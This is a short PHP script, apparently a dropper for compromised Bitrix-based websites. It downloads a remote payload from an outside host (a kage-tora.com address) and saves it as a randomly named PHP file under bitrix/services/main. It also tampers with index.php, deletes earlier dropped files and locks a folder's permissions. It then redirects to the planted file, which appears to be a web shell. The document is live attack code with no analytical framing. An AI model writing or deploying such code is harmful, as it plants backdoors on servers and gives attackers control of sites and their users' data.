<?php
$home = $_SERVER['SERVER_NAME'];
$randStr = str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
$rand = substr($randStr,0,6);
if(!is_dir("./bitrix/services"))
mkdir("./bitrix/services",0777);
if(!is_dir("./bitrix/services/main"))
mkdir("./bitrix/services/main",0777);
$Indexruler = '#(\<\?php.*?\/\* update \*\/.*?\/\* update \*\/.*?\?\>)#s';
$strDefault = file_get_contents("./index.php");
$strDefault = preg_replace($Indexruler, '', $strDefault);
file_put_contents("./index.php",$strDefault);
$url = 'http://nataliehaley.kage-tora.com/Awesome.txt';
$file = './bitrix/services/main/Awesome-' . $rand . '.php';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_TIMEOUT,10);
$data = curl_exec($ch);
if(!$data){
	$data = @file_get_contents($url);
}
file_put_contents($file, $data);
$filesize=abs(filesize($file));
if($filesize == 4149){
	unlink("./cl.php");
	unlink("./3EEE54242E72.php");
	unlink("./bitrix/admin/htmleditor2/3EEE54242E72.php");
	chmod("./bitrix/admin/htmleditor2",0444);
	$urls = "http://".$home."/bitrix/services/main/Awesome-".$rand.".php";
	echo '<meta http-equiv="Refresh" content="0; url='.$urls.'">';
}else{
	echo "proccess fail.";
}